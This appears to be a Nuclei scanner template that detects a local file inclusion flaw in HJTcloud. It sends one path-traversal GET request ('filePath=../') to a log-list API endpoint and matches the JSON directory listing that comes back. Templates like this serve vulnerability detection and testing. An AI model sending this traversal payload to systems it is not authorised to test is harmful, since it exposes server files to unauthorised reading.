id: hjtcloud-rest-arbitrary-file-read

info:
  name: HJTcloud - Local File Inclusion
  author: pikpikcu
  severity: high
  description: HJTcloud is vulnerable to local file inclusion.
  reference:
    - https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw
  classification:
    cpe: cpe:2.3:a:hjtcloud:hjtcloud:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 1
    vendor: hjtcloud
    product: hjtcloud
  tags: hjtcloud,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/him/api/rest/V1.0/system/log/list?filePath=../"

    matchers-condition: and
    matchers:
      - type: word
        name: hjtcloud
        cpe: cpe:2.3:a:hjtcloud:hjtcloud:*:*:*:*:*:*:*:*
        words:
          - '"name":'
          - '"length":'
          - '"filePath":'
          - '"list":'
        condition: and
        part: body

      - type: word
        name: hjtcloud-2
        cpe: cpe:2.3:a:hjtcloud:hjtcloud:*:*:*:*:*:*:*:*
        words:
          - "application/json"
        part: header

      - type: status
        status:
          - 200
